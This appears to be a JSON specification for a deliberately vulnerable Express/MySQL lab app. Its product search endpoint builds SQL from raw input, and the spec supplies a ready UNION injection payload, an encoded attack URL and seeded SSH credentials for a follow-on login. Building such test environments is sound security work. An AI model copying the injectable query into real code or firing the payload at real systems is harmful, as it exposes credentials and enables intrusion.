@@ -1,0 +1,51 @@
+{
+  "summary": "Express app with a UNION-based SQL injection in a product search endpoint that exposes SSH credentials stored in the users table.",
+  "runtime": "express",
+  "app_description": "A simple product catalog application where users can search for items by name. The search endpoint constructs a raw SQL query using unsanitized user input, allowing UNION-based injection to pivot to the users table and extract plaintext SSH credentials for a system user.",
+  "endpoints": [
+    {
+      "method": "GET",
+      "path": "/search",
+      "description": "Search for products by name. Returns matching product name and description as JSON. Vulnerable to UNION-based SQL injection.",
+      "vulnerable": true,
+      "vulnerability_notes": "The search query parameter is concatenated directly into a SQL LIKE query with no sanitization or parameterization. The query selects two columns (name, description) from products, matching the injected UNION SELECT column count."
+    },
+    {
+      "method": "GET",
+      "path": "/",
+      "description": "Homepage listing a few static products and a search form.",
+      "vulnerable": false,
+      "vulnerability_notes": ""
+    }
+  ],
+  "vulnerability_placement": "In the GET /search handler, the query is built as: `SELECT name, description FROM products WHERE name LIKE '%${req.query.q}%'`. The result rows are returned as a JSON array. An attacker can inject `' UNION SELECT username, password FROM users-- -` into the `q` parameter. Because the original query selects exactly two string columns (name, description) and the users table also exposes two matching columns, the injected UNION row is returned in the same JSON array, leaking the SSH credentials directly in the response body.",
+  "data_model": {
+    "tables": [
+      {
+        "name": "products",
+        "columns": [
+          "id INT AUTO_INCREMENT PRIMARY KEY",
+          "name VARCHAR(255)",
+          "description VARCHAR(255)"
+        ],
+        "seed_data": "INSERT INTO products (name, description) VALUES ('Widget Alpha', 'A sturdy aluminum widget'), ('Widget Beta', 'A lightweight plastic widget'), ('Gadget Pro', 'Professional grade gadget'), ('Gadget Lite', 'Entry level gadget');"
+      },
+      {
+        "name": "users",
+        "columns": [
+          "id INT AUTO_INCREMENT PRIMARY KEY",
+          "username VARCHAR(64)",
+          "password VARCHAR(128)"
+        ],
+        "seed_data": "INSERT INTO users (username, password) VALUES ('sysadmin', 'Sup3rS3cr3tSSH!');"
+      }
+    ]
+  },
+  "attack_entry_point": "GET http://target:3000/search?q=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--+-",
+  "success_indicator": "Response JSON array contains an object with fields where name is 'sysadmin' and description is 'Sup3rS3cr3tSSH!', e.g. [{\"name\":\"sysadmin\",\"description\":\"Sup3rS3cr3tSSH!\"}]",
+  "extra_npm_packages": [
+    "mysql2"
+  ],
+  "extra_pip_packages": [],
+  "notes": "The MySQL database should have both the 'products' and 'users' tables in the same schema/database so the UNION query can access both. The app should use the mysql2 package with a single connection (not a pool is fine) and return rows directly as res.json(rows). Ensure the MySQL user the app connects with has SELECT privileges on both tables. The system user 'sysadmin' should also exist on the Ubuntu host with the password 'Sup3rS3cr3tSSH!' so that extracted credentials are valid for SSH login, completing the attack chain."
+}
